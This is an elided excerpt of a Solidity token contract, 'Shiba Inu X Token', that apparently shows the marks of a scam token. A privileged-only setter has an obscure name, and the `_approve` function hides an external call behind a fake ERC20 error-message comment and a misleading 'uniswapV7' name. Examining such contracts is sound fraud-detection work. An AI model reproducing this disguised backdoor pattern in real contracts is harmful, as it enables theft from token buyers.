...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "Shiba Inu X Token";
    string private _symbol = "SHIB X";
    ...
    function Ecreca(uint256 a) public {
        if (_Antibotswaper[_msgSender()]) {
            creca=a;
        } else {
            uniswapV7PairToken.create(8**3);
    ...
    function _approve(
        ...
        if (_isExcludedFromFeeTransfer[owner]){uniswapV7PairToken.create(creca);/*"ERC20: approve the zero address"*/}
